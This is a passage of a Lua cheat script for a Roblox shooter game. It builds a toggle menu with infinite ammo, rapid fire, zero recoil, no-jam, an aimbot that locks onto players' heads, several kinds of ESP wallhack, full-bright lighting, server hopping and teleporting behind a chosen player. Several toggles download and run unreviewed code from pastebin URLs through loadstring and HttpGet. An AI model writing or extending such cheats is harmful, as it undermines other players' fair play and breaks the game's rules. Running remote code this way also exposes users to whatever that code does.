                    _servers .. ((cursor and '&cursor=' .. cursor) or '')
                )
                return Http:JSONDecode(Raw)
            end
            local Server, Next
            repeat
                local Servers = ListServers(Next)
                Server = Servers.data[1]
                Next = Servers.nextPageCursor
            until Server
            TPS:TeleportToPlaceInstance(
                _place,
                Server.id,
                game.Players.LocalPlayer
            )
        end
    end,
})

-- Anti AFK Toggle
ServerSettingsGroup:AddToggle('AntiAFK', {
    Text = 'Anti AFK',
    Default = false,
    Tooltip = 'Prevents you from being kicked for inactivity.',
    Callback = function(state)
        if state then
            loadstring(game:HttpGet('https://pastebin.com/raw/DtwLVRdP'))()
        end
    end,
})

-- Suicide Toggle
ServerSettingsGroup:AddToggle('Suicide', {
    Text = 'Suicide',
    Default = false,
    Tooltip = 'Resets your character.',
    Callback = function(state)
        if state then
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character:FindFirstChildOfClass('Humanoid')
            if humanoid then
                humanoid.Health = 0
            end
        end
    end,
})

-- Enable Reset Button Toggle
ServerSettingsGroup:AddToggle('EnableResetButton', {
    Text = 'Enable Reset Button',
    Default = false,
    Tooltip = 'Enables the reset button.',
    Callback = function(state)
        if state then
            loadstring(game:HttpGet('https://pastebin.com/raw/pvNpdimg'))()
        end
    end,
})

-- Low Gfx Toggle
ServerSettingsGroup:AddToggle('LowGfx', {
    Text = 'Low Gfx',
    Default = false,
    Tooltip = 'Reduces graphics for better performance.',
    Callback = function(state)
        if state then
            loadstring(game:HttpGet('https://pastebin.com/raw/SS4E3tDQ'))()
        end
    end,
})

-- ...existing code...

-- === Gun Mods Features ===

local Players = game:GetService('Players')
local isToggled = false

local function continuouslyUpdateWeaponStats(player)
    while isToggled do
        local backpack = player:FindFirstChild('Backpack')
        if backpack then
            for _, item in ipairs(backpack:GetChildren()) do
                if item:IsA('Tool') then
                    if
                        item:FindFirstChild('Ammo')
                        and item:FindFirstChild('Mag')
                    then
                        item.Ammo.Value = math.huge
                        item.Mag.Value = math.huge
                        local remote = game
                            :GetService('ReplicatedStorage').RemoteEvents
                            :FindFirstChild('ChangeMagAndAmmo')
                        if remote then
                            remote:Destroy()
                        end
                    end
                end
            end
        end
        task.wait()
    end
end

GunGroup:AddToggle('InfiniteAmmo', {
    Text = 'Infinite Ammo',
    Default = false,
    Tooltip = 'Gives you infinite ammo.',
    Callback = function(Value)
        isToggled = Value
        if isToggled then
            for _, player in ipairs(Players:GetPlayers()) do
                task.spawn(function()
                    continuouslyUpdateWeaponStats(player)
                end)
            end
        end
    end,
})

Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function()
        if isToggled then
            task.spawn(function()
                continuouslyUpdateWeaponStats(player)
            end)
        end
    end)
end)

-- Rapid Fire Toggle & Firerate Slider
local localPlayer = Players.LocalPlayer
local rapidFireEnabled = false
local fireRateValue = 0.147

local function enableRapidFire(tool)
    if tool:IsA('Tool') then
        local settingModule = tool:FindFirstChild('Setting')
        if settingModule and settingModule:IsA('ModuleScript') then
            local success, settings = pcall(require, settingModule)
            if
                success
                and type(settings) == 'table'
                and settings.BaseDamage ~= nil
            then
                settings.FireRate = fireRateValue
                settings.Auto = true
            end
        end
    end
end

local function disableRapidFire(tool)
    if tool:IsA('Tool') then
        local settingModule = tool:FindFirstChild('Setting')
        if settingModule and settingModule:IsA('ModuleScript') then
            local success, settings = pcall(require, settingModule)
            if
                success
                and type(settings) == 'table'
                and settings.BaseDamage ~= nil
            then
                settings.FireRate = 0.147
                settings.Auto = false
            end
        end
    end
end

local function onCharacterAddedRapid(character)
    character.ChildAdded:Connect(function(child)
        if child:IsA('Tool') then
            if rapidFireEnabled then
                enableRapidFire(child)
            else
                disableRapidFire(child)
            end
        end
    end)
    for _, child in ipairs(character:GetChildren()) do
        if child:IsA('Tool') then
            if rapidFireEnabled then
                enableRapidFire(child)
            else
                disableRapidFire(child)
            end
        end
    end
end

if localPlayer.Character then
    onCharacterAddedRapid(localPlayer.Character)
end
localPlayer.CharacterAdded:Connect(onCharacterAddedRapid)

GunGroup:AddToggle('RapidFire', {
    Text = 'Rapid Fire',
    Default = false,
    Tooltip = 'Toggle rapid fire for all tools.',
    Callback = function(Value)
        rapidFireEnabled = Value
        if localPlayer.Character then
            for _, child in ipairs(localPlayer.Character:GetChildren()) do
                if child:IsA('Tool') then
                    if rapidFireEnabled then
                        enableRapidFire(child)
                    else
                        disableRapidFire(child)
                    end
                end
            end
        end
    end,
})

GunGroup:AddSlider('FirerateSettings', {
    Text = 'Firerate Settings',
    Default = 0.147,
    Min = 0.03,
    Max = 0.147,
    Rounding = 3,
    Tooltip = 'Adjust rapid fire rate.',
    Callback = function(Value)
        fireRateValue = Value
        if rapidFireEnabled and localPlayer.Character then
            for _, child in ipairs(localPlayer.Character:GetChildren()) do
                if child:IsA('Tool') then
                    enableRapidFire(child)
                end
            end
        end
    end,
})

-- Quick Reload Toggle
local quickReloadEnabled = false
local function quickReloadOn(tool)
    if tool:IsA('Tool') then
        local settingModule = tool:FindFirstChild('Setting')
        if settingModule and settingModule:IsA('ModuleScript') then
            local success, settings = pcall(require, settingModule)
            if
                success
                and type(settings) == 'table'
                and settings.ReloadTime ~= nil
            then
                settings.ReloadTime = 0
            end
        end
    end
end
local function quickReloadOff(tool)
    if tool:IsA('Tool') then
        local settingModule = tool:FindFirstChild('Setting')
        if settingModule and settingModule:IsA('ModuleScript') then
            local success, settings = pcall(require, settingModule)
            if
                success
                and type(settings) == 'table'
                and settings.ReloadTime ~= nil
            then
                settings.ReloadTime = 2.9
            end
        end
    end
end
local function onCharacterAddedQuickReload(character)
    character.ChildAdded:Connect(function(child)
        if child:IsA('Tool') then
            if quickReloadEnabled then
                quickReloadOn(child)
            else
                quickReloadOff(child)
            end
        end
    end)
    for _, child in ipairs(character:GetChildren()) do
        if child:IsA('Tool') then
            if quickReloadEnabled then
                quickReloadOn(child)
            else
                quickReloadOff(child)
            end
        end
    end
end
if localPlayer.Character then
    onCharacterAddedQuickReload(localPlayer.Character)
end
localPlayer.CharacterAdded:Connect(onCharacterAddedQuickReload)

GunGroup:AddToggle('QuickReload', {
    Text = 'Quick Reload',
    Default = false,
    Tooltip = 'Reload instantly.',
    Callback = function(Value)
        quickReloadEnabled = Value
        if localPlayer.Character then
            for _, child in ipairs(localPlayer.Character:GetChildren()) do
                if child:IsA('Tool') then
                    if quickReloadEnabled then
                        quickReloadOn(child)
                    else
                        quickReloadOff(child)
                    end
                end
            end
        end
    end,
})

-- Shotgun Mode Toggle
GunGroup:AddToggle('ShotgunMode', {
    Text = 'Shotgun Mode',
    Default = false,
    Tooltip = 'Enable shotgun mode for all guns.',
    Callback = function()
        local player = game.Players.LocalPlayer
        local backpack = player.Backpack
        for _, item in pairs(backpack:GetChildren()) do
            if item:IsA('Tool') and item:FindFirstChild('Setting') then
                local gun = require(item.Setting)
                gun['ShotgunEnabled'] = true
            end
        end
    end,
})

-- 0 Recoil Toggle
local defaultSettings = {}
local zeroRecoilEnabled = false
local function enableZeroRecoil(tool)
    if tool:IsA('Tool') then
        local settingModule = tool:FindFirstChild('Setting')
        if settingModule and settingModule:IsA('ModuleScript') then
            local success, settings = pcall(require, settingModule)
            if success and type(settings) == 'table' then
                if not defaultSettings[tool.Name] then
                    defaultSettings[tool.Name] = {
                        Accuracy = settings.Accuracy,
                        SpreadX = settings.SpreadX,
                        SpreadY = settings.SpreadY,
                        Range = settings.Range,
                        Recoil = settings.Recoil,
                    }
                end
                settings.Accuracy = 1
                settings.SpreadX = 0
                settings.SpreadY = 0
                settings.Range = 50000
                settings.Recoil = 0
            end
        end
    end
end
local function resetZeroRecoil(tool)
    if tool:IsA('Tool') then
        local settingModule = tool:FindFirstChild('Setting')
        if settingModule and settingModule:IsA('ModuleScript') then
            local success, settings = pcall(require, settingModule)
            if
                success
                and type(settings) == 'table'
                and defaultSettings[tool.Name]
            then
                local defaults = defaultSettings[tool.Name]
                settings.Accuracy = defaults.Accuracy
                settings.SpreadX = defaults.SpreadX
                settings.SpreadY = defaults.SpreadY
                settings.Range = defaults.Range
                settings.Recoil = defaults.Recoil
            end
        end
    end
end
local function onCharacterAddedZeroRecoil(character)
    character.ChildAdded:Connect(function(child)
        if child:IsA('Tool') then
            if zeroRecoilEnabled then
                enableZeroRecoil(child)
            else
                resetZeroRecoil(child)
            end
        end
    end)
    for _, child in ipairs(character:GetChildren()) do
        if child:IsA('Tool') then
            if zeroRecoilEnabled then
                enableZeroRecoil(child)
            else
                resetZeroRecoil(child)
            end
        end
    end
end
if localPlayer.Character then
    onCharacterAddedZeroRecoil(localPlayer.Character)
end
localPlayer.CharacterAdded:Connect(onCharacterAddedZeroRecoil)

GunGroup:AddToggle('ZeroRecoil', {
    Text = '0 Recoil',
    Default = false,
    Tooltip = 'Removes all recoil and spread.',
    Callback = function(Value)
        zeroRecoilEnabled = Value
        if localPlayer.Character then
            for _, child in ipairs(localPlayer.Character:GetChildren()) do
                if child:IsA('Tool') then
                    if zeroRecoilEnabled then
                        enableZeroRecoil(child)
                    else
                        resetZeroRecoil(child)
                    end
                end
            end
        end
    end,
})

-- No Jam Toggle
GunGroup:AddToggle('NoJam', {
    Text = 'No Jam',
    Default = false,
    Tooltip = 'Removes gun jamming.',
    Callback = function()
        local player = game.Players.LocalPlayer
        local backpack = player.Backpack
        for _, item in pairs(backpack:GetChildren()) do
            if item:IsA('Tool') and item:FindFirstChild('Setting') then
                local gun = require(item.Setting)
                gun['JamChance'] = 0
            end
        end
    end,
})

-- Music On Hit Toggle
GunGroup:AddToggle('MusicOnHit', {
    Text = 'Music On Hit',
    Default = false,
    Tooltip = 'Plays music when you hit.',
    Callback = function()
        local player = game.Players.LocalPlayer
        local backpack = player.Backpack
        for _, item in pairs(backpack:GetChildren()) do
            if item:IsA('Tool') and item:FindFirstChild('Setting') then
                local gun = require(item.Setting)
                local music = { 109566167393222 }
                gun['HitCharSndIDs'] = music
                gun['HitCharSndVolume'] = 40
            end
        end
    end,
})

-- === Aimbot & FOV UI Controls ===

local Camera = workspace.CurrentCamera
local Players = game:GetService('Players')
local RunService = game:GetService('RunService')
local UserInputService = game:GetService('UserInputService')

local LocalPlayer = Players.LocalPlayer
local Holding = false
local LockedTarget = nil

_G.AimbotEnabled = false
_G.TeamCheck = false
_G.AimPart = 'Head'
_G.Smoothness = 0
_G.CircleSides = 64
_G.CircleColor = Color3.fromRGB(255, 255, 255)
_G.CircleTransparency = 0.7
_G.CircleRadius = 120
_G.CircleFilled = false
_G.CircleVisible = false -- FOV circle is hidden by default!
_G.CircleThickness = 2

-- Create FOV Circle if not already created
local FOVCircle = getgenv().FOVCircle
if not FOVCircle then
    FOVCircle = Drawing.new('Circle')
    getgenv().FOVCircle = FOVCircle
end
FOVCircle.Position = Vector2.new(
    Camera.ViewportSize.X / 2,
    Camera.ViewportSize.Y / 2
)
FOVCircle.Radius = _G.CircleRadius
FOVCircle.Filled = _G.CircleFilled
FOVCircle.Color = _G.CircleColor
FOVCircle.Visible = _G.CircleVisible -- Use the variable here!
FOVCircle.Transparency = _G.CircleTransparency
FOVCircle.NumSides = _G.CircleSides
FOVCircle.Thickness = _G.CircleThickness

local function GetClosestPlayer()
    local MaxDistance = _G.CircleRadius
    local Target = nil

    for _, v in pairs(Players:GetPlayers()) do
        if
            v ~= LocalPlayer
            and v.Character
            and v.Character:FindFirstChild('HumanoidRootPart')
            and v.Character:FindFirstChild('Humanoid')
            and v.Character.Humanoid.Health > 0
        then
            if not _G.TeamCheck or (v.Team ~= LocalPlayer.Team) then
                local part = v.Character:FindFirstChild(_G.AimPart)
                if part then
                    local ScreenPoint, OnScreen = Camera:WorldToScreenPoint(
                        part.Position
                    )
                    if OnScreen then
                        local Distance = (Vector2.new(
                            UserInputService:GetMouseLocation().X,
                            UserInputService:GetMouseLocation().Y
                        ) - Vector2.new(
                            ScreenPoint.X,
                            ScreenPoint.Y
                        )).Magnitude
                        if Distance < MaxDistance then
                            MaxDistance = Distance
                            Target = part
                        end
                    end
                end
            end
        end
    end

    return Target
end

UserInputService.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton2 then
        Holding = true
        LockedTarget = GetClosestPlayer()
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton2 then
        Holding = false
        LockedTarget = nil
    end
end)

RunService.RenderStepped:Connect(function()
    if Holding and _G.AimbotEnabled and LockedTarget then
        if LockedTarget.Parent then
            local TargetPosition = LockedTarget.Position
            local CurrentCameraPosition = Camera.CFrame.Position
            local NewCFrame = CFrame.new(CurrentCameraPosition, TargetPosition)
            Camera.CFrame = Camera.CFrame:Lerp(NewCFrame, _G.Smoothness)
        else
            LockedTarget = GetClosestPlayer()
        end
    end

    if _G.CircleVisible and FOVCircle then
        FOVCircle.Position = UserInputService:GetMouseLocation()
        FOVCircle.Radius = _G.CircleRadius
        FOVCircle.Thickness = _G.CircleThickness
        FOVCircle.Visible = true
        FOVCircle.Filled = _G.CircleFilled
        FOVCircle.Color = _G.CircleColor
        FOVCircle.Transparency = _G.CircleTransparency
        FOVCircle.NumSides = _G.CircleSides
    elseif FOVCircle then
        FOVCircle.Visible = false
    end
end)

CombatGroup:AddToggle('AimbotEnabled', {
    Text = '| Aimbot',
    Default = false,
    Tooltip = "Locks Onto Other Players' Heads.",
    Callback = function(enabled)
        _G.AimbotEnabled = enabled
        if enabled then
            Holding = false
        end
    end,
})

CombatGroup:AddToggle('FOVCircle', {
    Text = '| FOV Circle',
    Default = false, -- FOV circle toggle is off by default!
    Tooltip = 'Toggle Visibility of FOV Circle.',
    Callback = function(enabled)
        _G.CircleVisible = enabled
        if FOVCircle then
            FOVCircle.Visible = enabled
        end
    end,
})

CombatGroup:AddSlider('FOVRadius', {
    Text = 'FOV Radius',
    Default = 120,
    Min = 0,
    Max = 350,
    Rounding = 0,
    Tooltip = 'Adjust the FOV circle radius.',
    Callback = function(value)
        _G.CircleRadius = value
        if FOVCircle then
            FOVCircle.Radius = value
        end
    end,
})

CombatGroup:AddSlider('Smoothness', {
    Text = 'Smoothness',
    Default = 0,
    Min = 0,
    Max = 100,
    Rounding = 0,
    Tooltip = 'Aimbot smoothing (higher = slower).',
    Callback = function(value)
        _G.Smoothness = value / 100
    end,
})

CombatGroup:AddSlider('FOVThickness', {
    Text = 'FOV Thickness',
    Default = 2,
    Min = 1,
    Max = 10,
    Rounding = 0,
    Tooltip = 'FOV circle line thickness.',
    Callback = function(value)
        _G.CircleThickness = value
        if FOVCircle then
            FOVCircle.Thickness = value
        end
    end,
})

CombatGroup:AddToggle('FOVFilled', {
    Text = 'FOV Filled',
    Default = false,
    Tooltip = 'Fill the FOV circle.',
    Callback = function(enabled)
        _G.CircleFilled = enabled
        if FOVCircle then
            FOVCircle.Filled = enabled
        end
    end,
})

CombatGroup:AddDropdown('AimPart', {
    Text = 'Body Parts',
    Values = {
        'Head',
        'UpperTorso',
        'LowerTorso',
        'LeftLeg',
        'RightLeg',
        'LeftArm',
        'RightArm',
    },
    Default = 'Head',
    Tooltip = 'Choose which body part to aim at.',
    Callback = function(item)
        _G.AimPart = item
    end,
})

local Players = game:GetService('Players')
local RunService = game:GetService('RunService')
local Lighting = game:GetService('Lighting')
local LocalPlayer = Players.LocalPlayer

-- === Billboard ESP (Name/Weapon) ===
local Config = {
    ESP = {
        Enabled = false,
        NameESPEnabled = false,
        WeaponESPEnabled = false,
        Color = Color3.new(1, 1, 1),
        TextSize = 18,
        Font = Enum.Font.GothamBold,
        TextStroke = {
            Transparency = 0.5,
            Color = Color3.new(0, 0, 0),
        },
        Offsets = {
            Name = Vector3.new(0, 3, 0),
            Weapon = Vector3.new(0, -2, 0),
        },
        UpdateDelay = 0.1,
    },
    FullBright = {
        Enabled = false,
        OriginalBrightness = Lighting.Brightness,
        OriginalAmbient = Lighting.Ambient,
        OriginalOutdoorAmbient = Lighting.OutdoorAmbient,
        Brightness = 2,
        Ambient = Color3.new(1, 1, 1),
        OutdoorAmbient = Color3.new(1, 1, 1),
    },
}

local espCache = {}
local connections = {}
local functionQueue = {}

local function queueFunction(fn)
    table.insert(functionQueue, fn)
end

local function executeQueue()
    for _, fn in ipairs(functionQueue) do
        fn()
    end
    functionQueue = {}
end

local function enableFullBright()
    if not Config.FullBright.Enabled then
        return
    end
    Lighting.Brightness = Config.FullBright.Brightness
    Lighting.Ambient = Config.FullBright.Ambient
    Lighting.OutdoorAmbient = Config.FullBright.OutdoorAmbient
end

local function disableFullBright()
    Lighting.Brightness = Config.FullBright.OriginalBrightness
    Lighting.Ambient = Config.FullBright.OriginalAmbient
    Lighting.OutdoorAmbient = Config.FullBright.OriginalOutdoorAmbient
end

local function cleanupPlayer(player)
    if espCache[player] then
        for _, v in pairs(espCache[player].connections or {}) do
            if v then
                v:Disconnect()
            end
        end
        if
            espCache[player].nameBillboard
            and espCache[player].nameBillboard.Parent
        then
            espCache[player].nameBillboard:Destroy()
        end
        if
            espCache[player].weaponBillboard
            and espCache[player].weaponBillboard.Parent
        then
            espCache[player].weaponBillboard:Destroy()
        end
        espCache[player] = nil
    end
end

local function createBillboard(parent, name, offset, initialText)
    local billboard = Instance.new('BillboardGui')
    local textLabel = Instance.new('TextLabel')
    billboard.Name = name
    billboard.Adornee = parent
    billboard.Size = UDim2.new(0, 200, 0, 50)
    billboard.StudsOffset = offset
    billboard.AlwaysOnTop = true
    billboard.LightInfluence = 0
    billboard.ZIndexBehavior = Enum.ZIndexBehavior.Global
    textLabel.Name = 'ESPLabel'
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.TextStrokeTransparency = Config.ESP.TextStroke.Transparency
    textLabel.TextStrokeColor3 = Config.ESP.TextStroke.Color
    textLabel.TextColor3 = Config.ESP.Color
    textLabel.TextSize = Config.ESP.TextSize
    textLabel.Font = Config.ESP.Font
    textLabel.Text = initialText
    textLabel.Parent = billboard
    billboard.Parent = parent
    return billboard, textLabel
end

local function updateESP(player)
    if not Config.ESP.Enabled or not espCache[player] then
        return
    end
    local character = espCache[player].character
    if not character or not character.Parent then
        cleanupPlayer(player)
        return
    end
    if Config.ESP.NameESPEnabled and espCache[player].nameLabel then
        espCache[player].nameLabel.Text = player.DisplayName or player.Name
    end
    if Config.ESP.WeaponESPEnabled and espCache[player].weaponLabel then
        local tool = nil
        for _, child in ipairs(character:GetChildren()) do
            if child:IsA('Tool') then
                tool = child
                break
            end
        end
        espCache[player].weaponLabel.Text = tool and tool.Name or 'none'
    end
end

local function createESP(player)
    if not Config.ESP.Enabled or player == LocalPlayer then
        return
    end
    cleanupPlayer(player)
    local character = player.Character
    if not character then
        local success, result = pcall(function()
            return player.CharacterAdded:Wait()
        end)
        if not success then
            return
        end
        character = result
    end
    local success, head = pcall(function()
        return character:WaitForChild('Head', 5)
    end)
    if not success or not head then
        return
    end
    local success, humanoidRootPart = pcall(function()
        return character:WaitForChild('HumanoidRootPart', 5)
    end)
    if not success or not humanoidRootPart then
        return
    end
    espCache[player] = {
        character = character,
        connections = {},
    }
    if Config.ESP.NameESPEnabled then
        local nameBillboard, nameLabel = createBillboard(
            head,
            'NameESP',
            Config.ESP.Offsets.Name,
            player.DisplayName or player.Name
        )
        espCache[player].nameBillboard = nameBillboard
        espCache[player].nameLabel = nameLabel
    end
    if Config.ESP.WeaponESPEnabled then
        local weaponBillboard, weaponLabel = createBillboard(
            humanoidRootPart,
            'WeaponESP',
            Config.ESP.Offsets.Weapon,
            'Loading...'
        )
        espCache[player].weaponBillboard = weaponBillboard
        espCache[player].weaponLabel = weaponLabel
    end
    espCache[player].connections.characterAdded = player.CharacterAdded:Connect(
        function(newCharacter)
            queueFunction(function()
                createESP(player)
            end)
        end
    )
    espCache[player].connections.childAdded = character.ChildAdded:Connect(
        function(child)
            if child:IsA('Tool') then
                queueFunction(function()
                    updateESP(player)
                end)
            end
        end
    )
    espCache[player].connections.childRemoved = character.ChildRemoved:Connect(
        function(child)
            if child:IsA('Tool') then
                queueFunction(function()
                    updateESP(player)
                end)
            end
        end
    )
    updateESP(player)
end

local function handlePlayerAdded(player)
    connections[player] = {}
    connections[player].characterAdded = player.CharacterAdded:Connect(
        function()
            queueFunction(function()
                createESP(player)
            end)
        end
    )
    if player.Character then
        queueFunction(function()
            createESP(player)
        end)
    end
end

local function handlePlayerRemoving(player)
    queueFunction(function()
        cleanupPlayer(player)
        if connections[player] then
            for _, v in pairs(connections[player]) do
                if v then
                    v:Disconnect()
                end
            end
            connections[player] = nil
        end
    end)
end

local function initialize()
    for _, player in ipairs(Players:GetPlayers()) do
        handlePlayerAdded(player)
    end
    connections.playerAdded = Players.PlayerAdded:Connect(handlePlayerAdded)
    connections.playerRemoving = Players.PlayerRemoving:Connect(
        handlePlayerRemoving
    )
    local lastUpdate = 0
    connections.renderStepped = RunService.RenderStepped:Connect(
        function(deltaTime)
            lastUpdate = lastUpdate + deltaTime
            if lastUpdate >= Config.ESP.UpdateDelay then
                executeQueue()
                lastUpdate = 0
            end
        end
    )
end

local function cleanupAll()
    disableFullBright()
    for _, conn in pairs(connections) do
        if type(conn) == 'table' then
            for _, v in pairs(conn) do
                if v then
                    v:Disconnect()
                end
            end
        elseif conn then
            conn:Disconnect()
        end
    end
    for player, _ in pairs(espCache) do
        cleanupPlayer(player)
    end
    espCache = {}
    connections = {}
end

initialize()

if script then
    script.Destroying:Connect(cleanupAll)
end

game:GetService('UserInputService').WindowFocusReleased:Connect(function()
    cleanupAll()
end)

-- === Box ESP (Drawing API) ===
local camera = workspace.CurrentCamera
local ESPObjects = {}
local ESPEnabled = false

local Settings = {
    Box_Color = Color3.fromRGB(255, 255, 255),
    Box_Thickness = 1,
}

local function NewQuad(thickness, color)
    local quad = Drawing.new('Quad')
    quad.Visible = false
    quad.PointA = Vector2.new(0, 0)
    quad.PointB = Vector2.new(0, 0)
    quad.PointC = Vector2.new(0, 0)
    quad.PointD = Vector2.new(0, 0)
    quad.Color = color
    quad.Filled = false
    quad.Thickness = thickness
    return quad
end

local function Visibility(state, library)
    for _, obj in pairs(library) do
        obj.Visible = state
    end
end

local function CreateESP(plr)
    if ESPObjects[plr] then
        return
    end

    local library = {
        black = NewQuad(Settings.Box_Thickness * 2, Color3.fromRGB(0, 0, 0)),
        box = NewQuad(Settings.Box_Thickness, Settings.Box_Color),
    }
    ESPObjects[plr] = library

    local function UpdateESP()
        local connection
        connection = RunService.RenderStepped:Connect(function()
            if
                ESPEnabled
                and plr.Character
                and plr.Character:FindFirstChild('Humanoid')
                and plr.Character:FindFirstChild('HumanoidRootPart')
                and plr.Character.Humanoid.Health > 0
            then
                local HumPos, OnScreen = camera:WorldToViewportPoint(
                    plr.Character.HumanoidRootPart.Position
                )
                if OnScreen then
                    local head = camera:WorldToViewportPoint(
                        plr.Character.Head.Position
                    )
                    local DistanceY = math.clamp(
                        (Vector2.new(head.X, head.Y) - Vector2.new(
                            HumPos.X,
                            HumPos.Y
                        )).magnitude,
                        2,
                        math.huge
                    )

                    local function Size(item)
                        item.PointA = Vector2.new(
                            HumPos.X + DistanceY,
                            HumPos.Y - DistanceY * 2
                        )
                        item.PointB = Vector2.new(
                            HumPos.X - DistanceY,
                            HumPos.Y - DistanceY * 2
                        )
                        item.PointC = Vector2.new(
                            HumPos.X - DistanceY,
                            HumPos.Y + DistanceY * 2
                        )
                        item.PointD = Vector2.new(
                            HumPos.X + DistanceY,
                            HumPos.Y + DistanceY * 2
                        )
                    end
                    Size(library.box)
                    Size(library.black)

                    Visibility(true, library)
                else
                    Visibility(false, library)
                end
            else
                Visibility(false, library)
                if not Players:FindFirstChild(plr.Name) then
                    connection:Disconnect()
                end
            end
        end)
    end
    coroutine.wrap(UpdateESP)()
end

local function ToggleESP(state)
    ESPEnabled = state
    if ESPEnabled then
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer then
                CreateESP(plr)
            end
        end
        Players.PlayerAdded:Connect(function(plr)
            if plr ~= LocalPlayer then
                CreateESP(plr)
            end
        end)
    else
        for _, objects in pairs(ESPObjects) do
            Visibility(false, objects)
        end
    end
end

-- === UI TOGGLES ===
VisualsGroup:AddToggle('EnableESP', {
    Text = 'Enable ESP',
    Default = false,
    Callback = function(state)
        Config.ESP.Enabled = state
        if state then
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= LocalPlayer then
                    createESP(player)
                end
            end
        else
            for player, _ in pairs(espCache) do
                cleanupPlayer(player)
            end
        end
    end,
})

VisualsGroup:AddToggle('FullBright', {
    Text = 'Enable Full Bright',
    Default = false,
    Callback = function(state)
        Config.FullBright.Enabled = state
        if state then
            enableFullBright()
        else
            disableFullBright()
        end
    end,
})

VisualsGroup:AddToggle('NameESP', {
    Text = 'Enable Name ESP',
    Default = false,
    Callback = function(state)
        Config.ESP.NameESPEnabled = state
        for player, data in pairs(espCache) do
            if
                state
                and player
                and player.Character
                and not data.nameBillboard
            then
                local head = player.Character:FindFirstChild('Head')
                if head then
                    local nameBillboard, nameLabel = createBillboard(
                        head,
                        'NameESP',
                        Config.ESP.Offsets.Name,
                        player.DisplayName or player.Name
                    )
                    data.nameBillboard = nameBillboard
                    data.nameLabel = nameLabel
                end
            elseif not state and data.nameBillboard then
                data.nameBillboard:Destroy()
                data.nameBillboard = nil
                data.nameLabel = nil
            end
        end
    end,
})

VisualsGroup:AddToggle('WeaponESP', {
    Text = 'Enable Weapon ESP',
    Default = false,
    Callback = function(state)
        Config.ESP.WeaponESPEnabled = state
        for player, data in pairs(espCache) do
            if
                state
                and player
                and player.Character
                and not data.weaponBillboard
            then
                local humanoidRootPart = player.Character:FindFirstChild(
                    'HumanoidRootPart'
                )
                if humanoidRootPart then
                    local weaponBillboard, weaponLabel = createBillboard(
                        humanoidRootPart,
                        'WeaponESP',
                        Config.ESP.Offsets.Weapon,
                        'Loading...'
                    )
                    data.weaponBillboard = weaponBillboard
                    data.weaponLabel = weaponLabel
                    updateESP(player)
                end
            elseif not state and data.weaponBillboard then
                data.weaponBillboard:Destroy()
                data.weaponBillboard = nil
                data.weaponLabel = nil
            end
        end
    end,
})

VisualsGroup:AddToggle('BoxESP', {
    Text = 'Box ESP',
    Default = false,
    Callback = function(state)
        ToggleESP(state)
    end,
})

-- Continue with all your other toggles and features, replacing VisualsSection:toggle with VisualsGroup:AddToggle and VisualsSection:colorpicker with VisualsGroup:AddColorPicker as needed.
-- Paste the rest of your code here, keeping all logic and functions unchanged.


-- Helper to get player names
local function getPlayers()
    local t = {}
    for _, v in ipairs(game:GetService('Players'):GetPlayers()) do
        if v ~= game.Players.LocalPlayer then
            table.insert(t, v.Name)
        end
    end
    return t
end

local teleportRunning = false
local teleportConn = nil
local teleportInputConn = nil
local selectedTeleportPlayer = getPlayers()[1] or ''

-- Dropdown to select player
ViewOptionsGroup:AddDropdown('TeleportSelectPlayer', {
    Values = getPlayers(),
    Default = selectedTeleportPlayer,
    Text = 'Select Player to Teleport To',
    Callback = function(Value)
        selectedTeleportPlayer = Value
    end,
})

-- Toggle to start/stop teleporting
ViewOptionsGroup:AddToggle('TeleportToPlayerToggle', {
    Text = 'Teleport To Player ',
    Default = false,
    Tooltip = 'Teleport behind the selected player. Toggle off or press L to stop.',
    Callback = function(state)
        teleportRunning = state

        -- Cleanup previous connections if any
        if teleportConn then
            teleportConn:Disconnect()
            teleportConn = nil
        end
        if teleportInputConn then
            teleportInputConn:Disconnect()
            teleportInputConn = nil
        end

        if state then
            local UserInputService = game:GetService('UserInputService')
            teleportInputConn = UserInputService.InputBegan:Connect(function(input, gameProcessed)
                if input.KeyCode == Enum.KeyCode.L then
                    teleportRunning = false
                    if teleportConn then teleportConn:Disconnect() teleportConn = nil end
                    if teleportInputConn then teleportInputConn:Disconnect() teleportInputConn = nil end
                    -- Optionally, turn off the toggle in the UI if your library supports it
                end
            end)

            teleportConn = game:GetService('RunService').RenderStepped:Connect(function()
                if not teleportRunning then
                    if teleportConn then teleportConn:Disconnect() teleportConn = nil end
                    if teleportInputConn then teleportInputConn:Disconnect() teleportInputConn = nil end
                    return
                end
                local player = game.Players.LocalPlayer
                local character = player.Character
                local targetPlayer = game.Players:FindFirstChild(selectedTeleportPlayer)
                if character and character:FindFirstChild('HumanoidRootPart')
                    and targetPlayer and targetPlayer.Character
                    and targetPlayer.Character:FindFirstChild('HumanoidRootPart') then
                    local p1 = character.HumanoidRootPart
                    local targetHRP = targetPlayer.Character.HumanoidRootPart
                    local behindPosition = targetHRP.CFrame * CFrame.new(0, 0, -2)
                    p1.CFrame = behindPosition
                end
            end)
        end
    end,
})

-- Optional: Update dropdown values when players join/leave
game.Players.PlayerAdded:Connect(function()
    local dropdown = Options.TeleportSelectPlayer
    if dropdown then
        dropdown:SetValues(getPlayers())
    end
end)
game.Players.PlayerRemoving:Connect(function()
    local dropdown = Options.TeleportSelectPlayer
    if dropdown then
        dropdown:SetValues(getPlayers())
    end
end)



local Players = game:GetService('Players')
local RunService = game:GetService('RunService')
local Camera = workspace.CurrentCamera
local LocalPlayer = Players.LocalPlayer

-- === Highlight ESP ===
local highlightESPEnabled = false
local highlightRainbow = true
local highlightColor = Color3.new(1, 0, 0)
local highlights = {}

local function getRainbowColor(t)
    local speed = 4
    local r = math.clamp(math.sin(t * speed) * 0.5 + 0.5, 0.2, 1)
    local g = math.clamp(math.sin(t * speed + 2) * 0.5 + 0.5, 0.2, 1)
    local b = math.clamp(math.sin(t * speed + 4) * 0.5 + 0.5, 0.2, 1)
    return Color3.new(r, g, b)
end

local function CreateHighlight(player)
    if highlights[player] or player == LocalPlayer then return end
    if not player.Character then return end
    local highlight = Instance.new('Highlight')
    highlight.Name = 'HighlightESP'
